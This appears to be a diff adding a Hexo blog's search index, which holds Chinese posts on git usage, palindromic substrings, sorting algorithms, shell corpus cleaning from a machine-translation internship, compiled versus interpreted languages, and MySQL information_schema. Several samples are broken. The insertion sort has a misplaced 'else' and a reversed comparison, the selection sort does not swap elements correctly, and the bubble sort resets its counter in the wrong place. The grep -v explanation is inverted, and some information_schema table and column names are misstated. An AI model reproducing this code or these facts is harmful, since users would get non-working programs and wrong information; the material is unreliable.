+<p>4、使用命令：git add ××× 添加要提交到github远程仓库的文件或者文件<br>夹，如果全部提交可以使用：git add . 。</p>
+</blockquote>
+<blockquote>
+<p>5、git commit -m “备注”。</p>
+</blockquote>
+<blockquote>
+<p>6、git remote add origin <a href="https://github.com/weizhaome/blog" target="_blank" rel="noopener">https://github.com/weizhaome/blog</a> 建立远程仓库链接。</p>
+</blockquote>
+<blockquote>
+<p>7、最后使用 git push -u origin master 就可以将本地工程提交到github上了。</p>
+</blockquote>
+<h2 id="遇见的问题："><a href="#遇见的问题：" class="headerlink" title="遇见的问题："></a>遇见的问题：</h2><blockquote>
+<p>1、当github远程仓库中存在本地仓库所不存在的文件时需要先将两部分进行合并：git pull –rebase origin master 之后再执行push操作。</p>
+</blockquote>
+<blockquote>
+<p>2、Push 一直提示 “Permission denied (publickey) “ , 这个可能是由于你的没有目标仓库和分支的权限，导致无法更新数据。</p>
+<ul>
+<li>确认 push 方式，如果是 SSH 方式请检查你的 SSH 公钥是否正确（如果您有多个私钥，请使用 ssh-add 命令来指定默认使用的私钥）； HTTPS 方式检查密码及用户名是否正确。</li>
+<li>对目标分支是否有写权限。</li>
+<li>善用 搜索。</li>
+</ul>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>字符串的连续子串是回文的个数（Python）</title>
+    <url>/2019/10/21/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E8%BF%9E%E7%BB%AD%E5%AD%90%E4%B8%B2%E6%98%AF%E5%9B%9E%E6%96%87%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%88Python%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="字符串的连续子串是回文的个数"><a href="#字符串的连续子串是回文的个数" class="headerlink" title="字符串的连续子串是回文的个数"></a>字符串的连续子串是回文的个数</h1><ul>
+<li><p>首先编写一个函数用来判断字符串是否是回文：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def isPalindrome(mystr):</span><br><span class="line">    l = len(mystr)</span><br><span class="line">    i = 0</span><br><span class="line">    count = 0</span><br><span class="line">    while i&lt;(l/2):</span><br><span class="line">        if(mystr[i]==mystr[l-i-1]):</span><br><span class="line">            count += 1</span><br><span class="line">            i += 1</span><br><span class="line">        else:</span><br><span class="line">            count = 0</span><br><span class="line">            break</span><br><span class="line">    if(count==0):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找出字符串所有的连续子串并分别判断是否为回文：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def palindNum(mystr):</span><br><span class="line">    sub_str = []</span><br><span class="line">    ls = len(mystr)</span><br><span class="line">    count = 0</span><br><span class="line">    for i in range(1,ls):#i控制步长</span><br><span class="line">        for j in range(ls-i+1):#j控制位置</span><br><span class="line">            sub_str.append(mystr[j:j+i])</span><br><span class="line">    for i in sub_str:</span><br><span class="line">        count += isPalindrome(i)</span><br><span class="line">    return count</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>常见排序算法总结</title>
+    <url>/2019/04/16/%E5%B8%B8%E8%A7%81%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="常见排序算法总结"><a href="#常见排序算法总结" class="headerlink" title="常见排序算法总结"></a>常见排序算法总结</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><h3 id="基本思想："><a href="#基本思想：" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>比较序列中相邻两个数据的大小，如果两个数的排序方式和目标相反则调换两个数的位置。</p>
+</blockquote>
+<h3 id="代码实现-python-："><a href="#代码实现-python-：" class="headerlink" title="代码实现(python)："></a>代码实现(python)：</h3><pre><code>def bubble_sort(mylist):
+    n = len(mylist)
+    for j in range(n-1):
+        for i in range(0,n-1-j):
+            count = 0
+            if mylist[i]&gt;mylist[i+1]:
+                mylist[i], mylist[i+1]=mylist[i+1],mylist[i]
+                count+=1
+         if count == 0:
+             break
+</code></pre><h3 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote>
+<p>最好情况：正序有序，则只需要比较n次不需要交换位置，则时间复杂度为O(n)。<br>最坏情况：逆序有序，则需要比较(n-1)+(n-2)+……+1，则时间复杂度为O(n<em>n)。<br>平均情况：O(n</em>n)。</p>
+</blockquote>
+<h3 id="稳定性："><a href="#稳定性：" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote>
+<p>稳定性是指序列中两个相等的数在经过排序算法后两个数的位置是否会发生变化，因为冒泡排序当相邻两个数相等时不会交换他们的位置，所以冒泡算法是稳定的。</p>
+</blockquote>
+<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="基本思想：-1"><a href="#基本思想：-1" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>序列中的数往前依次与其前面的数作比较寻找该数的合适位置，直至最后一个元素。</p>
+</blockquote>
+<h3 id="代码实现-python"><a href="#代码实现-python" class="headerlink" title="代码实现(python)"></a>代码实现(python)</h3><pre><code>def insertion_sort(mylist):
+    n = len(mylist)
+    for i in range(1,n):
+        for j in range(i,0,-1):
+            if mylist[j]&gt;mylist[j-1]:
+                mylist[j],mylist[j-1]=mylist[j-1],mylist[j]
+                else:
+                    break
+</code></pre><h3 id="时间复杂度：-1"><a href="#时间复杂度：-1" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote>
+<p>最好情况：正序有序，比较n次不需要交换位置，时间复杂度为O(n)。<br>最坏情况：逆序有序，比较n个元素需要跟前面的n-1个元素比较，时间复杂度为O(n^2)。<br>平均情况：O(n^2)。</p>
+</blockquote>
+<h3 id="稳定性：-1"><a href="#稳定性：-1" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote>
+<p>当两个元素比较时如果两个元素相等则不需要移动，所以插入排序是稳定的。 </p>
+</blockquote>
+<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="基本思想：-2"><a href="#基本思想：-2" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>每次从待排序的数据元素中直接选择最大或者最小的元素作为序列的第一个元素。</p>
+</blockquote>
+<h3 id="代码实现（Python）"><a href="#代码实现（Python）" class="headerlink" title="代码实现（Python）"></a>代码实现（Python）</h3><pre><code>def selection_sort(mylist):
+    n = len(mylist)
+    for i in range(0,n-1):
+        min = mylist[i]
+        for j in range(1,n):
+            if min &gt; mylist[j]:
+               min = mylist[j]
+        if min != mylist[i]:
+            temp = min
+            min = mylist[j]
+            mylist[j]=min
+</code></pre><h3 id="时间复杂度：-2"><a href="#时间复杂度：-2" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><blockquote>
+<p>最好情况：O(n^2)<br>最坏情况：O(n^2)<br>平均情况：O(n^2)  </p>
+</blockquote>
+<h3 id="稳定性：-2"><a href="#稳定性：-2" class="headerlink" title="稳定性："></a>稳定性：</h3><blockquote>
+<p>不稳定</p>
+</blockquote>
+<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h3 id="基本思想：-3"><a href="#基本思想：-3" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。  </p>
+</blockquote>
+<h3 id="过程示意图："><a href="#过程示意图：" class="headerlink" title="过程示意图："></a>过程示意图：</h3><p><img src="/images/sort/shell&#39;s sort.jpg" alt="shell_sort"></p>
+<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h3 id="基本思想：-4"><a href="#基本思想：-4" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为二路归并</p>
+</blockquote>
+<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><blockquote>
+<p>归并操作(merge)，也叫归并算法，指的是将两个顺序序列合并成一个顺序序列的方法。<br>如　设有数列{6，202，100，301，38，8，1}<br>初始状态：6,202,100,301,38,8,1<br>第一次归并后：{6,202},{100,301},{8,38},{1}，比较次数：3；<br>第二次归并后：{6,100,202,301}，{1,8,38}，比较次数：4；<br>第三次归并后：{1,6,8,38,100,202,301},比较次数：4；<br>总的比较次数为：3+4+4=11；<br>逆序数为14；  </p>
+</blockquote>
+<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><blockquote>
+<p>归并排序的速度仅次于快速排序，且是一种稳定的排序算法。</p>
+</blockquote>
+<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="基本思想：-5"><a href="#基本思想：-5" class="headerlink" title="基本思想："></a>基本思想：</h3><blockquote>
+<p>任意选取待排序数组中的一个数作为关键数，将待排序数组中比关键数小的数都位于关键数的左边，比关键数大的数都在关键数的右边。</p>
+</blockquote>
+<h3 id="排序演示："><a href="#排序演示：" class="headerlink" title="排序演示："></a>排序演示：</h3><blockquote>
+<p>假设一开始序列{xi}是：5，3，7，6，4，1，0，2，9，10，8。<br>此时，选取关键数为序列的第一个元素：ref=5，i=1，j=11。<br>从后往前找，第一个比5小的数是x8=2，因此序列为：2，3，7，6，4，1，0，5，9，10，8。<br>此时i=1，j=8，从前往后找，第一个比5大的数是x3=7，因此序列为：2，3，5，6，4，1，0，7，9，10，8。<br>此时，i=3，j=8，从第8位往前找，第一个比5小的数是x7=0，因此：2，3，0，6，4，1，5，7，9，10，8。<br>此时，i=3，j=7，从第3位往后找，第一个比5大的数是x4=6，因此：2，3，0，5，4，1，6，7，9，10，8。<br>此时，i=4，j=7，从第7位往前找，第一个比5小的数是x6=1，因此：2，3，0，1，4，5，6，7，9，10，8。<br>此时，i=4，j=6，从第4位往后找，直到第6位才有比5大的数，这时，i=j=6，ref成为一条分界线，它之前的数都比它小，之后的数都比它大，对于前后两部分数，可以采用同样的方法来排序。</p>
+</blockquote>
+<h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><blockquote>
+<p>快速排序是一种不稳定的排序算法，最好情况下的时间复杂度为O(nlog^n),最坏情况下为：O(n^2),平均情况下为：O(nlog^n)。</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>sorts</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>机器翻译实习总结</title>
+    <url>/2019/07/05/%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91%E5%AE%9E%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="机器翻译（中英）实习总结"><a href="#机器翻译（中英）实习总结" class="headerlink" title="机器翻译（中英）实习总结"></a>机器翻译（中英）实习总结</h1><p>2019年5月-7月参与机器翻译项目，接下来将对这两个月的收获进行总结。</p>
+<h2 id="Transform模型的理解"><a href="#Transform模型的理解" class="headerlink" title="Transform模型的理解"></a>Transform模型的理解</h2><blockquote>
+<p>谷歌提出的transformer模型，使用self-attention层和全连接层实现了很好的机器翻译BLEU结果，没有采用传统的RNN/LSTM/GRU结构，解决了长依赖和训练并行度问题，降低了计算的复杂度。关于论文的详细讲解可以参考：<a href="https://www.jianshu.com/p/ef41302edeef等的讲解。" target="_blank" rel="noopener">https://www.jianshu.com/p/ef41302edeef等的讲解。</a></p>
+<ul>
+<li><strong>Attention机制</strong><br><strong> 简介:</strong><br>在传统的encoder-decoder模型中，对于句子对&lt;X,Y&gt;,，我们输入给定句子X=&lt;x1,x2…xm&gt; 经过encoder进行编码后转化为中间语义表示为C=F(x<sub>1</sub>,x<sub>2</sub>…x<sub>m</sub>)，解码器decoder的任务是根据句子的中间语义表示C和之前已经生成的历史信息y<sub>1</sub>,y<sub>2</sub>…y<sub>i-1</sub>)来生成i时刻要生成的单词yi=G(C,y<sub>1</sub>,y<sub>2</sub>…y<sub>i-1</sub>)。<br>这样的框架因为对于预测每一个yi对应的语义编码C都是一样的，无法完全表示整个序列的信息，而且先输入的内容携带的信息会被后面的信息覆盖掉。attention机制将用来解决该问题，在预测时不仅关注全局语义编码向量C，而且增加‘注意力范围’，来表示接下来输出词时候要重点关注输入序列的哪些部分。<br><img src="/images/nmt/Attention.png" alt="attention"><br>此时生成目标句子单词的过程就成了下面的形式:<br>y<sub>1</sub>=f1(C<sub>1</sub>)<br>y<sub>2</sub>=f1(C<sub>2</sub>,y<sub>1</sub>)<br>y<sub>3</sub>=f1(C<sub>3</sub>,y<sub>1</sub>,y<sub>2</sub>)<br><strong>计算过程：</strong>1、计算encoder每个结点与decoderd当前结点的Score值：<br>[s1,s2,s3,s4]=softmax(dot([x1,x2,x3,x4],yi-1))<br>2、当前结点的语义编码为Ci=s1*x1+s2*x2+s3*x3+s4*x4</li>
+<li><strong>self-attention机制</strong><br>self-attention是attention机制的一种，attention是输入输出的权重，而self-attention是自己对自己的权重，计算公式如下图：<br><img src="/images/nmt/self-attention.png" alt="self-attention"><br>Q(queries)，K (keys) and V(Values)， 其中 Key and values 一般对应同样的 vector， K=V 而Query vecotor  是对应目标句子的 word vector。</li>
+<li><strong>论文代码的理解</strong><br>所查看的代码使用tensorflow框架，其各个函数的调用以及参数传递如下图：<br><img src="/images/nmt/transformer-function.png" alt="transformer"><br>这里使用了TensorFlow中的高级API：Estimator、Experiment,具体讲解可以参考：<a href="https://www.jiqizhixin.com/articles/2017090901" target="_blank" rel="noopener">https://www.jiqizhixin.com/articles/2017090901</a></li>
+</ul>
+</blockquote>
+<p><img src="/images/nmt/API.png" alt="API">  </p>
+<h2 id="shell命令总结"><a href="#shell命令总结" class="headerlink" title="shell命令总结"></a>shell命令总结</h2><p>语料库中包含两千多万条训练数据，经过了一系列的过滤得到一个干净整洁的训练预料。在过程中主要用shell对其进行处理，提高处理的速度和效率。接下来将对过程中使用到的shell命令进行总结。</p>
+<ul>
+<li><strong>awk</strong><br>awk用来对文本进行较复杂格式处理,<a href="https://www.cnblogs.com/silence-hust/p/4534606.html" target="_blank" rel="noopener">https://www.cnblogs.com/silence-hust/p/4534606.html</a> 中对awk做了较为详细的汇总。<blockquote>
+<p>1、统计英文文本中每行的单词个数可以用命令：<br>awk -F ‘ ‘ ‘BEGIN{print “count”, “lineNum”}{print NF “\t” NR}’ filename 其中，-F 表示分隔符，NF是awk的内置函数表示读取记录的域的个数，NR表示已经读取的记录数，文件的每行相当于记录，文件的每个字段，也就是每个单词相当于记录的域。其中BEGIN后面所跟的命令只会在遍历文件前执行一次，END命令也会在遍历完文件后执行一次。<br>2、删除英文文本中单词数量少于5的行可以用命令：<br>awk -F ‘ ‘ ‘{if (NF &lt; 5) {next} {print}}’ filename 其中，if会用来做判断，如果满足条件将会调用{next}直接跳到下一行，如果不满足会执行{print}输出当前行。<br>3、awk ‘!a[$0]++’ filename 将会去除文件中重复的行，’!’表示非，$0表示当前行，a[$0]以当前行为数据下标建立数组a,a[$0]++表示给数组a赋值，a[$0]+=1。详细解释可以参照：<a href="https://www.cnblogs.com/irockcode/p/7044646.html" target="_blank" rel="noopener">https://www.cnblogs.com/irockcode/p/7044646.html</a>  </p>
+</blockquote>
+</li>
+<li><strong>grep</strong><br>grep更适合单纯的查找和匹配文本， <a href="https://blog.csdn.net/liupeifeng3514/article/details/79880878" target="_blank" rel="noopener">https://blog.csdn.net/liupeifeng3514/article/details/79880878</a> 中对grep命令做了详细的介绍。<blockquote>
+<p>1、统计出现文本中出现某种模式n词以上的行：grep -E ‘(pattern){n,}’ filename 其中-E表示使用正则表达式，(pattern)是要找的某种模式，用正则表达式进行匹配，{n,}表示连续出现n次以上。<br>2、grep -f file1 file2 过滤掉文件2中包含文件1的内容。 如果添加 -v 可以实现反向输出，即可以输出两个文件重复的行。</p>
+</blockquote>
+</li>
+<li><strong>shell效率问题</strong><br>因为数据量在千万级，所以一个好的处理策略要比处理工具更加重要，本次项目是中-英的机器翻译，所以在对数据筛选时要同时兼顾两个文件，即源端数据文本和目标端数据文本，在去重的过程中一开始的想法是将源段出现重复和行号找出后保存在文件中，之后删除目标段对应的行，但速度会很慢。<br>后来利用paste 先将两个文件用TAB作为分隔符左右拼接起来：<br>paste -d\t file1 file2 &gt; tempfile<br>之后利用awk去除重复行：<br>awk -F ‘\t’ ‘!a[$1]++’ tempfile &gt; uniqfile 这里的$1表示第一列即源段文本。<br>最后用cut将其分开。<br>后来看到了<a href="https://blog.csdn.net/dubendi/article/details/79103170，关于如何提高shell效率的博客。" target="_blank" rel="noopener">https://blog.csdn.net/dubendi/article/details/79103170，关于如何提高shell效率的博客。</a></li>
+<li><strong>shell输出重定向</strong><br><img src="/images/nmt/stdout.png" alt="stdout"><br>在此次项目中原始训练集在一个文件中，按照一行源段，一行目标端，一行空格来放。所以首要任务是将其分成两个文件，这里利用重定向写了一小段shell脚本：<pre><code class="#!/usr/bin/perl">$n=0;
+while(&lt;&gt;){
+chomp();
+if($n%3==0){print STDOUT &quot;$_\n&quot;;}
+if($n%3==1){print STDERR &quot;$_\n&quot;;}
+$n+=1;
+}
+</code></pre>
+初始化变量n,用来表示读取的是源段还会目标端的行，按行读取文件，当是空行时用chomp()删除改行，如果不是判断n是否能被3整除，如果可以的话用标准输出将其输出，如果不是的话用标准错误输出将其输出，最后在命令行运行该脚本：$./vcut.pl sg-mt.txt 2&gt; train.en 1&gt; train.zh 实现将两中文本分开。</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>解释性语言和编译型语言的区别</title>
+    <url>/2019/03/25/%E8%A7%A3%E9%87%8A%E6%80%A7%E8%AF%AD%E8%A8%80%E5%92%8C%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
+    <content><![CDATA[<h1 id="解释性语言和编译型语言的区别"><a href="#解释性语言和编译型语言的区别" class="headerlink" title="解释性语言和编译型语言的区别"></a>解释性语言和编译型语言的区别</h1><blockquote>
+<p>在高级语言编程中需要将高级语言翻译成计算机能够理解的机器语言。其中的翻译又分为两种方式：一种是编译，一种是解释。</p>
+<ul>
+<li>解释性语言翻译的过程是在运行的过程中进行的。Java是编译-解释型，Javac命令首先将程序源码的.java文件编译成 .class字节码文件，之后Java虚拟机边读取边翻译边执行。</li>
+<li>编译型语言需要在运行之前有单独的翻译过程。C语言的编译过程包括：C源程序–&gt;预编译处理(.c)–&gt;编译、优化程序(.s、.asm)–&gt;汇编程序(.obj、.o、.a、.ko)–&gt;链接程序(.exe、.elf、.axf等)</li>
+</ul>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>Java/C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mysql的information_schema库</title>
+    <url>/2021/03/14/mysql%E7%9A%84information-schema%E5%BA%93/</url>
+    <content><![CDATA[<h1 id="information-schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。"><a href="#information-schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。" class="headerlink" title="information_schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。"></a>information_schema数据库中保存了mysql服务器所有数据库的信息。如：数据库名、数据库表、表的列名、访问权限等。</h1><ul>
+<li>information_schema的表schema中的列schema_name记录了所有数据库的名字。</li>
+<li>information_schema的表tables中的列table_schema记录了所有的数据库名字。</li>
+<li>information_schema的表tables中的列table_name记录了所有数据库的表的名字。</li>
+<li>information_schema的表columns中的列table_schema记录了所有的数据库名字。</li>
+<li>information_schema的表columns中的列table_name记录了所有数据库表的名字。</li>
+<li>information_schema的表columns中的列columns_name记录了所有数据库表的列的名字。</li>
+</ul>
+]]></content>
+  </entry>
 </search>
